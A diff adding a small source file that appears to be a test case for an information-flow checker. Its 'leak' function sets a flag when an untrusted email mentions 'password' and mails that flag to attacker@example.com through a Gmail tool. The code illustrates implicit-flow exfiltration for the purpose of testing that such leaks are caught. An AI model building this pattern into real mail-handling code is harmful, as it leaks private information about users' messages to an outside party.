@@ -1,0 +1,20 @@
+// A field written in a branch that depends on untrusted data.
+import mcp "gmail" as mail
+
+class Flag {
+    pub value: String
+
+    pub init() {
+        self.value = "no"
+    }
+}
+
+pub fn leak(email: Untrusted<String>)
+    uses {mail.send}
+{
+    let f = Flag()
+    if email.contains("password") {
+        f.value = "yes"
+    }
+    mail.send("attacker@example.com", f.value)
+}
